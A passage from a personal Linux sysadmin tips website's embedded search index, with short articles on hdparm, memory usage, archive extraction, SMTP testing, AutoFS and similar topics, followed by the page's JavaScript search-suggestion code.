makes the modification of the hard disk properties silent. Without this parameter, you will get information in the console about the status of modifications made to the hard disk.\nIf you have a CD-ROM drive, you can be inspired by the block below:\n/dev/hdc { quiet dma = on io32_support = 1 cd_speed = 40 } To activate these changes immediately, you can execute the command:\n/etc/init.d/hdparm start Appendix: parameters for the /etc/hdparm.conf file linkHere are the first lines of the /etc/hdparm.conf file that describe the different possible options for the blocks you can define for each of your disks.\n# -q be quiet #quiet # -a sector count for filesystem read-ahead #read_ahead_sect = 12 # -A disable/enable the IDE drive's read-lookahead feature #lookahead = on # -b bus state #bus = on # -c enable (E)IDE 32-bit I/O support - can be any of 0,1,3 #io32_support = 1 # -d disable/enable the \"using_dma\" flag for this drive #dma = on # -D enable/disable the on-drive defect management #defect_mana = off # -E cdrom speed #cd_speed = 40 # -m sector count for multiple sector I/O #mult_sect_io = 32 # -P maximum sector count for the drive's internal prefetch mechanism #prefetch_sect = 12 # -r read-only flag for device #read_only = off # -S standby (spindown) timeout for the drive #spindown_time = 24 # -u interrupt-unmask flag for the drive #interrupt_unmask = on # -W Disable/enable the IDE drive's write-caching feature #write_cache = off # -X IDE transfer mode for newer (E)IDE/ATA2 drives #transfer_mode = 34 # -y force to immediately enter the standby mode #standby # -Y force to immediately enter the sleep mode #sleep # -Z Disable the power-saving function of certain Seagate drives #disable_seagate # -M Set the acoustic management properties of a drive #acoustic_management "
            }
        );
    index.add(
            {
                id:  828 ,
                href: "\/Informations_sur_la_m%C3%A9moire_vive\/",
                title: "RAM Information",
                description: "Understanding memory management in Linux systems, including disk cache usage and how to correctly evaluate free memory.",
                content: "Memory Management Overview linkEvidence of Memory Usage linkWhen a system has been running for some time, traditional tools like ’top’ often report a surprisingly small amount of free memory. For example, after about 3 hours, the machine on which I’m writing this shows less than 60 MB of free memory, although I have 512 MB on this system. But where has all this memory gone?\nMost of it is used by the disk cache, which currently occupies around 290 MB. The top command displays this amount under the “cached” column. Memory used for the cache is essentially free, in the sense that it can be quickly reclaimed if a running program (or one that has just been launched) needs it.\nWhy? linkThe reason Linux uses so much memory for disk cache is that unused RAM is simply wasted. Keeping data in the cache means that if something requests previously used data again, there’s a good chance it will still be present in the cache.\nRetrieving information from the cache is about 1,000 times faster than reading it from the hard drive. If the information is not in the cache, the hard drive will need to be read anyway, but in this case, there is no time lost.\nEstimating Free Memory linkTo get a better estimate of the amount of memory actually free for applications, run the command:\n# Estimating actual free memory: free -m The -m option means megabytes and the output should look something like this:\ntotal used free shared buffers cached Mem: 503 451 52 0 14 293 -/+ buffers/cache: 143 360 Swap: 1027 0 1027 The -/+ buffers/cache line shows the amounts of free and used memory as seen by applications.\nIn general, as long as swap is little used, memory usage has no impact on performance.\nNote that I have 512 MB in my machine but the free command only shows 503 available. This is mainly because the kernel cannot be swapped and therefore the memory it occupies will never be available.\nThere may also be some regions reserved for/by hardware for various purposes, depending on the system architecture.\n"
            }
        );
    index.add(
            {
                id:  829 ,
                href: "\/D%C3%A9compressions_sous_diff%C3%A9rents_formats\/",
                title: "Uncompress for Different Formats",
                description: "A guide to uncompress different types of archive formats in Linux including RPM, DEB, ZIP, CAB, and more.",
                content: "Ah, file uncompression! Always having to remember that “-xjvfirhfidopgnfudjs” command! Not so easy, right? So here’s a little reminder:\nBefore anything else, if you don’t know what a file contains: file This command displays the file type based on its content, not its extension! (This information is based on the /etc/magic file)\nRPM Files link Extract an rpm: rpm2cpio | cpio -mid rpm2cpio belongs to the “rpm” package\ncpio belongs to the “cpio” package\nDEB Files link Extract a deb: ar xv ar belongs to the binutils package\nZIP Files link Extract a zip: unzip unzip belongs to the infozip package\nMicrosoft CAB Files link Extract a Microsoft cab: cabextract cabextract can be obtained from uklinux.net\nInstallShield CAB Files link Extract an InstallShield cab: unshield unshield can be obtained from synce.sourceforge.net\nNote: InstallShield cab files are usually named data1.cab, data1.hdr, data2.cab, etc.\nARJ Files link Extract an arj: unarj x unarj belongs to the “bin” package, and a complete version of arj can be obtained from arj.sourceforge.net (in which case you would use “arj x” instead of “unarj x”)\nRAR Files link Extract a rar: unrar x unrar can be obtained from rarlab.com\nACE Files link Extract an ace: unace x unace (“LinUnAce”) can be obtained from winace.com\nLHA Files link Extract a lha: lha x lha is available from its official site\nJAR Files link Extract a jar: jar xvf jar can be obtained from Sun’s JRE or JDK\nNote: xpi files are actually jar files.\n7z Files link Extract a 7z: 7za x 7za can be obtained from the p7zip project page on Sourceforge.\nFor those who don’t know what 7z format is, take a look at the 7zip homepage, which is a free zip/7z archiver for Windows.\nCommon Formats link Those that need no introduction: Uncompress a Z file:\nuncompress Uncompress a gz file:\ngzip -d Uncompress a bz2 file:\nbzip2 -d Extract a tar:\ntar xvf And the combinations…\nExtract a tgz or tar.gz:\ntar zxvf Extract a tar.bz2:\ntar jxvf "
            }
        );
    index.add(
            {
                id:  830 ,
                href: "\/fanout-run-same-command-on-multiple-machines\/",
                title: "Fanout: Run the Same Command on Multiple Machines Simultaneously",
                description: "How to use Fanout to execute commands on multiple servers at the same time",
                content: "These two tools by William Stearns can quickly become essential when managing multiple machines…\nAs indicated in the title, these tools allow you to run commands simultaneously on multiple machines, and even interactively (with fanterm).\nI didn’t find anything in the repositories or as a .deb package. So I “alienated” the rpm:\nwget http://www.stearns.org/fanout/fanout-0.6.1-0.noarch.rpm sudo alien fanout-0.6.1-0.noarch.rpm sudo dpkg -i fanout_0.6.1-1_all.deb For SSH on non-standard ports, I used the config file (see man ssh_config)\ncat .ssh/config Host bipbip Hostname 172.16.2.200 User yannick Port 2222 Authentication is done by key (see man ssh)\nI replaced xterm with Eterm in /usr/bin/fanterm\n"
            }
        );
    index.add(
            {
                id:  831 ,
                href: "\/Colorisations_dans_les_consoles\/",
                title: "Console Colorization",
                description: "How to add color to your Linux console for better readability of man pages and log files",
                content: "Introduction linkHere we’ll see how to colorize certain elements in console terminals.\nMan Pages linkTo make the output of the man command more readable by adding color, you can do the following which involves using the most command instead of less for man pages:\nsudo apt-get install most export PAGER=`which most` (use the Alt Gr+7 characters to execute the command)\nTo permanently set the PAGER value:\nsudo vi /etc/security/pam_env.conf Then modify to have these lines:\n#PAGER DEFAULT=less PAGER DEFAULT=most Log Files linkI installed CCZE which allows me to better view Postfix logs:\napt-get install ccze I’ll let you read the man page and visit the website for all the features… but I already like the very practical:\ntail -f /var/log/mail.log | ccze Alternatively, there’s also the possibility to save the colorized output as an HTML page… Just need to set up Apache :)\nccze -h \u003c /var/log/mail.log \u003e output.htm Note that it doesn’t just colorize Postfix, but also fetchmail, exim, apache, procmail, proftpd, squid, vsftpd, syslog, and others.\n"
            }
        );
    index.add(
            {
                id:  832 ,
                href: "\/Swaks_-_Swiss_Army_Knife_SMTP\/",
                title: "Swaks - Swiss Army Knife SMTP",
                description: "Learn about Swaks (Swiss Army Knife SMTP), a versatile tool for SMTP testing and management with examples of use cases.",
                content: "You may know Netcat, the “TCP/IP Swiss Army Knife”, now here’s Swaks, the “SMTP Swiss Army Knife” :)\napt-get install swaks The description is accurate, I can’t say it better… you can do almost anything with it. Just read the man page to get ideas for how to use it.\nAn example of usage that allows you to reinject emails without having to go through a local server:\nfor i in *.eml; do cat \"$i\" | swaks -g -n -t recipient@yop.tld -f sender@yop.tld -s 1.2.3.4 ; done If you don’t specify a server, it even resolves the MX record…\nIn short, it’s essential for anyone who works with SMTP.\n"
            }
        );
    index.add(
            {
                id:  833 ,
                href: "\/R%C3%A9injection_de_Spams_pour_tests\/",
                title: "Spam Reinjection for Testing",
                description: "How to reinjecting spam messages for testing purposes, including methods to recover spam headers and use them for server testing.",
                content: "I need to reinject spam for testing on a server… but using the simple mail command is not sufficient to reinject messages with their headers…\nWe’ll use the sendmail command (even for Postfix):\nfor i in message.*; do cat \"$i\" | sendmail -f from@domain.tld to@domain.tld ;done The Postfix sendmail command implements the Postfix to Sendmail compatibility interface:\n-f sender Set the envelope sender address. This is the address where delivery problems are sent to, unless the message contains an Errors-To: message header. To get “fresh” spam samples, you can use SpamArchive.org\nwget ftp://spamarchive.org/pub/archives/submit/679.r2.gz And a small script to split everything:\ncat convert #!/usr/bin/perl -pl if ( /^From / ) { close(OUT); open(OUT, \"\u003e\u003emessage.\".$i++) || die \"Can't open new file! $i\\n\"; select(OUT); print STDERR \"Opened $i\"; } # ./convert 679.r2 "
            }
        );
    index.add(
            {
                id:  834 ,
                href: "\/Sipcalc_:_Calculateur_de_sous_r%C3%A9seaux\/",
                title: "Sipcalc: Subnet Calculator",
                description: "A guide on using Sipcalc, a simple subnet calculator for Linux.",
                content: "Subnets… those famous subnets. When you don’t calculate them every day, it’s difficult to remember how to do it in 30 seconds. Here’s the solution:\nsudo apt-get install sipcalc "
            }
        );
    index.add(
            {
                id:  835 ,
                href: "\/Kernel_:_Compilation_des_modules\/",
                title: "Kernel: Module Compilation",
                description: "Guide on compiling Linux kernel modules with focus on Iptables firewall requirements.",
                content: "Iptables is nowadays the Linux firewall of choice. However, when you’re a beginner, it’s not always easy to know what each module corresponds to.\nMinimum Requirements linkWhat do you need to recompile at minimum for the kernel?\nCONFIG_PACKET - Direct communication with network interfaces CONFIG_NETFILTER - Kernel management, necessary for Netfilter CONFIG_IP_NF_CONNTRACK - Necessary for NAT and Masquerade CONFIG_IP_NF_NETFILTER - Adds NETFILTER table CONFIG_IP_NF_IPTABLES - Required for iptables user space utility CONFIG_IP_NF_MANGLE - Adds MANGLE table CONFIG_IP_NF_NAT - Adds NAT table Rule not to add:\nCONFIG_NET_FASTROUTE - Fast routing bypasses NETFILTER entry points Legacy Firewall Compatibility linkHere are the modules that will provide compatibility with previous firewalls:\nCONFIG_IP_NF_COMPAT_IPCHAINS CONFIG_IP_NF_COMPAT_IPFWADM Service-Specific Modules linkThis is a list of modules needed according to the services you want to use:\nIP_CONNTRACK_AMANDA - Amanda is a backup software IP_CONNTRACK_FTP - FTP is used for file transfers IP_CONNTRACK_IRC - IRC (Internet Relay Chat) IP_CONNTRACK_TFTP - Trivial FTP "
            }
        );
    index.add(
            {
                id:  836 ,
                href: "\/Emacs_:_Quick_Reference_Card\/",
                title: "Emacs: Quick Reference Card",
                description: "A quick reference guide for Emacs users with downloadable PDF resource.",
                content: "As I’m not an Emacs user, I can’t personally vouch for the quality of this Quick Reference Card. But since the Vi one is good, this one should theoretically be as well :).\nHere is the Emacs Quick Reference Card PDF.\n"
            }
        );
    index.add(
            {
                id:  837 ,
                href: "\/Compilations_foireuses\/",
                title: "Failed Compilations",
                description: "Solutions for common Linux compilation failures and required libraries",
                content: "Another failed compilation? As usual, you’re missing a library. I’ve listed here the minimum packages you should have to avoid problems.\nIf you get a message like this during compilation:\nchecking for C compiler default output... configure: error: C compiler cannot create executables This is typically the kind of error you might encounter. Install the following packages:\ngcc libc6 libc6-dev make autoconf Also consider:\nglibc2 glibc2-dev For Debian users like me:\napt-get install libc6 libc6-dev make autoconf glibc2 glibc2-dev "
            }
        );
    index.add(
            {
                id:  838 ,
                href: "\/VNC_:_Mode_Listen_sous_Linux\/",
                title: "VNC: Listen Mode on Linux",
                description: "How to use VNC in Listen mode on Linux systems",
                content: "Introduction linkYes, in Windows, listen mode is easy! But on Linux, where is the “Run listening mode” icon? ;-)\nIt’s actually quite simple:\nxvnc4viewer -listen -Shared The “Shared” option allows multiple users to connect simultaneously.\nOn the client side, you need to open incoming port 5500 and you’re good to go.\n"
            }
        );
    index.add(
            {
                id:  839 ,
                href: "\/Shell_:_renommer_en_masse_avec_compteur\/",
                title: "Shell: Batch Renaming with Counter",
                description: "How to rename multiple files in batch with a counter using shell scripting.",
                content: "Here’s a script that allows you to rename JPG files while adding a counter:\nexport j=0 # export is only useful if you're working in interactive mode (not in a script) for i in *.JPG ; do mv $i `echo $i | sed s/^/$j\\ -\\ /` j=$((j+1)) done Here’s a faster method for renaming files:\nInstead of typing:\nmv my_file.txt my_file.that_i_want_to_backup You can simply do:\nmv my_file.{txt,that_i_want_to_backup} "
            }
        );
    index.add(
            {
                id:  840 ,
                href: "\/Google_Astuces_de_recherche\/",
                title: "Google Search Tips",
                description: "Useful tips and tricks to improve your Google search results and find information more efficiently.",
                content: "Google Search Tips linkHere are some useful tips for searching with Google:\n\"keyword\": Will search for the exact term “keyword” as it is enclosed in quotation marks 0 * 0 = toto's head: Will search for all possible options in place of the * symbol DHCP -microsoft: Will search for DHCP everywhere the word “microsoft” is not present WSUS -site:microsoft.com: Will search for WSUS everywhere except on the Microsoft website user OR $USER OR %username%: Will search for multiple possibilities define:\"SUN Solaris\": Will directly search for the definition rather than pages talking about SUN Solaris manual cpu intel filetype:pdf: The filetype option allows you to search for specific file types such as xls, pdf, doc… intitle:keyword: Requires “keyword” to be in the title inurl:keyword: Requires “keyword” to be in the URL URL Parameter Tips linkHere are some tricks to add at the end of the search URL:\n\u0026as_qdr=mX: Replace X with the number of months. This will only show results more recent than X months. \u0026filter=0: Shows duplicates or similar pages if they exist "
            }
        );
    index.add(
            {
                id:  841 ,
                href: "\/Debian_:_Erreur_GPG_lors_d\u0027apt-get_update\/",
                title: "Debian: GPG Error During apt-get update",
                description: "How to solve GPG key errors when running apt-get update on Debian systems",
                content: " W: GPG error: http://security.debian.org testing/updates Release: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY key-number Is this type of message appearing? It’s quite annoying, especially since it happens every year. To solve this problem, follow these steps:\ngpg --keyserver pgpkeys.mit.edu --recv-key key-number gpg -a --export key-number | apt-key add - "
            }
        );
    index.add(
            {
                id:  842 ,
                href: "\/fuse-refus-de-monter-les-disques-a-cause-de-dev-fuse\/",
                title: "FUSE: Unable to Mount Disks Due to /dev/fuse",
                description: "How to solve the FUSE disk mounting issue when /dev/fuse is missing.",
                content: "I once encountered this problem. I didn’t look into it for long, but it’s quite annoying, and the worst part is that I don’t have an explanation for it.\nAfter a reboot, I got an error message saying that FUSE could not mount my encrypted disks because “/dev/fuse” did not allow it.\nIndeed, the device file didn’t exist, which is why I had to run this command to recreate it:\nsudo mknod /dev/fuse -m 0666 c 10 229 "
            }
        );
    index.add(
            {
                id:  843 ,
                href: "\/switch_mac_os_case_sensitive\/",
                title: "Switching to Case-Sensitive File System on Mac OS X",
                description: "Instructions on how to clear the DNS cache on Mac OS X systems",
                content: "Introduction linkOn Mac OS X, the default file system is case-insensitive. However, you can switch to a case-sensitive file system if needed. This is particularly useful for certain applications or development environments that require case sensitivity.\nwarning Switching to a case-sensitive file system can cause issues with applications that expect a case-insensitive file system. This is why moving to a case-sensitive file system is not recommended. Instead, it is preferable to create a dedicated volume (not a partition) with a case-sensitive file system. This way, you can keep your main volume case-insensitive while having a separate volume for applications that require case sensitivity. The other advantage is that you won’t encounter any issue with TimeMachine backups and restoring your system (you can’t restore a case-sensitive volume to a case-insensitive one without a long and painful procedure).\nCreate a new volume linkTo create a new volume with a case-sensitive file system, follow these steps:\nOpen Disk Utility (found in Applications \u003e Utilities). Select your main disk (usually named “Macintosh HD”). Click on the + sign next to Volume. Choose a name for the new volume (e.g., “workspace”) and set it to APFS (Case-sensitive) or APFS (Case-sensitive, Encrypted) (it’s recommended to use the Encrypted for security reasons):\nUse the new volume linkOnce the new volume is created, you should see it and find relecant information. You can use it for applications or development environments that require a case-sensitive file system.\nFrom the terminal, create a symbolic link to the new volume:\nln -s /Volumes/workspace ~/workspace This will create a symbolic link in your home directory that points to the new volume. You can now use ~/workspace as a path to access the case-sensitive volume. It’s very useful for development purposes, especially if you are using a version control system like Git or Mercurial that may have issues with case-insensitive file systems.\n"
            }
        );
    index.add(
            {
                id:  844 ,
                href: "\/AutoFS_:_montage_et_d%C3%A9montage_de_partages\/",
                title: "AutoFS: Mounting and Unmounting Shares",
                description: "Learn how to set up AutoFS to automatically mount and unmount various network filesystems including NFS, CIFS, SSH, and FTP.",
                content: "Introduction linkYou already installed Linux on your networked desktop PC and now you want to work with files stored on some other PCs in your network. This is where autofs comes into play. This tutorial shows how to configure autofs to use CIFS to access Windows or Samba shares from Linux Desktop PCs. It also includes a tailored configuration file.\nIf autofs Version 4.0 or newer is already installed, you should find these files:\n/etc/auto.master /etc/auto.smb on your system. Otherwise start the package manager of your distribution (e.g. YaST on SuSE, synaptic on Debian or Ubuntu, …) and install it. When you are at it, also install the Samba client package (look for smbclient), because we will also need this.\nInstallation linkJust do:\napt-get install autofs Configuration linkNFS linkInstallation linkFor NFS, it’s not very hard, just be sure it works fine when you mount it manually. You also need to install portmap:\napt-get install portmap Configuration linkNow edit for example the auto.master file, and add a nfs file line (/etc/auto.master):\n/mnt /etc/auto.nfs --timeout=600 This means it will be mounted in /mnt and will be automatically unmounted after 10 min. Now edit your new file (/etc/auto.nfs):\n* -fstype=nfs,rw 192.168.0.187:/home With some virtualized systems like OpenVZ, you’ll need to add ’nolock’ option in addition to fstype options (/etc/auto.nfs):\n* -fstype=nfs,rw,nolock 192.168.0.187:/home CIFS linkInstallation linkIf autofs is already installed, it is probably still not configured and not working. Assuming your Linux Distribution contains a Linux 2.6.x kernel I recommend to use the common internet file system (cifs) module to access files on the network. You also need smbfs to be installed:\napt-get install smbfs cifs-utils Configuration linkPlease store the following file as (/etc/auto.master):\n/mnt /etc/auto.cifs on your computer. You need root (or sudo) to have the permissions to do this (/etc/auto.cifs):\n# share -fstype=cifs,rw,noperm,credentials=/etc/auto.cred ://server/share This file must be executable to work (chmod 755)!\nJust create a /etc/auto.cred file where credentials will be added. Then add those 2 lines (/etc/auto.cred):\nusername=le_login password=le_password Change the permissions:\nchmod 755 /etc/auto.cifs chmod a-x /etc/auto.cifs chmod 600 /etc/auto.cred Restart service:\n/etc/init.d/autofs restart That’s all.\nSSH linkInstallation linkFirst we need to install sshfs:\napt-get install sshfs fuse Configuration linkKey exchange linkYou first need to do key exchange from the root user on remote host.\nAutofs configuration linkNow edit the master file and add this line (/etc/auto.master):c/\n/mnt/remote_server /etc/auto.sshfs --timeout=360,--ghost Now add this and adapt it for your needs (/etc/auto.sshfs):\nmyfolder -fstype=fuse,port=22,rw,allow_other :sshfs\\#login@remote_host\\:/the/share myfolder: folder will be accessible in /mnt/remote_server/myfolder login: type your ssh login /the/share: set the remote share Do not forget to create the folder on your client machine.\nNow reload autofs:\n/etc/init.d/autofs reload Now access to /mnt/remote_server/myfolder it will be automatically mounted.\nFTP linkYou’ll need to install this package:\naptitude install curlftpfs Then add this line in /etc/auto.master:\n# /etc/auto.master /mnt/autofs /etc/auto.ftp --timeout=600 Now we need to create this file and add a line like that (replace with your information):\n# /etc/auto.ftp backups_ftp -fstype=fuse,allow_other,user=user:password :curlftpfs\\server Create a mountpoint per home user linkTo create a home mountpoint per connected user, you have to configure (NFS for example) like this:\n# /etc/auto.nfs * -fstype=nfs,rw 192.168.0.187:/home/\u0026 \u0026: corresponds to each user\nVerify linkUse the command:\nls -als /cifs/FILESERVERNAME/SHARENAME or\nmount.cifs //server/share /test -o username=login,password=pass to check if it works. If not, consult the system logfiles (usually /var/log/messages or /var/log/syslog) for messages.\nFAQ linkMy NFS connection is very slow linkI can see this kind of things in the syslogs:\n# /var/log/syslog ... Jun 6 16:26:40 debusertest kernel: portmap: server localhost not responding, timed out Jun 6 16:26:40 debusertest kernel: RPC: failed to contact portmap (errno -5). You just need to install the portmap package :-)\nI encounter NFS delay problem linkIf you have this kind of problem:\nJul 8 15:50:39 deb-devtest2 automount[8415]: mount(nfs): mkdir_path /mnt/share/drive failed: No such file or directory Jul 8 15:50:39 deb-devtest2 automount[8415]: failed to mount /mnt/share/drive Grow your auto.nfs file, option timeo:\n# /etc/auto.nfs drive -fstype=nfs,rw,rsize=8192,wsize=8192,timeo=60,intr server:/700G/share/drive My CIFS doesn’t want to mount linkYou may have a problem while automounting a cifs share getting these errors in the logs:\nDec 27 11:36:07 pmavro-laptop automount[27824]: lookup(program): lookup for backups failed Dec 27 11:36:07 pmavro-laptop automount[27824]: failed to mount /mnt/backups/backups As recommended in this documentation, auto.cifs needs execute rights. But depending on the version of autofs you use, you may need to remove those rights:\nchmod a-x /etc/auto.cifs Then restart autofs daemon.\nWhy autofs volumes are hidden when not mounted? linkIt is possible to show wished volumes that are not mounted, this is easier to know which ones are available. To do it, simply add ‘–ghost’ on a line on auto.master. Example:\n# /etc/auto.master [...] /mnt/mount1 /etc/auto.sshfs --timeout=720,--ghost /mnt/mount2 /etc/auto.cifs --timeout=720,--ghost "
            }
        );
    index.add(
            {
                id:  845 ,
                href: "\/docs\/coding\/c\/",
                title: "C",
                description: "Documentation for C",
                content: "Content for C\n"
            }
        );
    search.addEventListener('input', show_results, true);

    function show_results(){
        const maxResult =  5 ;
        const minlength =  0 ;
        var searchQuery = sanitizeHTML(this.value);
        var results = index.search(searchQuery, {limit: maxResult, enrich: true});

        
        const flatResults = new Map(); 
        for (const result of results.flatMap(r => r.result)) {
        if (flatResults.has(result.doc.href)) continue;
        flatResults.set(result.doc.href, result.doc);
        }

        suggestions.innerHTML = "";
        suggestions.classList.remove('d-none');

        
        if (searchQuery.length < minlength) {
            const minCharMessage = document.createElement('div')
            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
            minCharMessage.classList.add("suggestion__no-results");
            suggestions.appendChild(minCharMessage);
            return;
        } else {
            
            if (flatResults.size === 0 && searchQuery) {
                const noResultsMessage = document.createElement('div')
                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
                noResultsMessage.classList.add("suggestion__no-results");
                suggestions.appendChild(noResultsMessage);
                return;
            }
        }

        
        for(const [href, doc] of flatResults) {
            const entry = document.createElement('div');
            suggestions.appendChild(entry);

            const a = document.createElement('a');
            a.href = href;
            entry.appendChild(a);

            const title = document.createElement('span');
            title.textContent = doc.title;
            title.classList.add("suggestion__title");
            a.appendChild(title);

            const description = document.createElement('span');
            description.textContent = doc.description;
            description.classList.add("suggestion__description");
            a.appendChild(description);

            suggestions.appendChild(entry);

            if(suggestions.childElementCount == maxResult) break;
        }
    }
    }());
</script></body></html>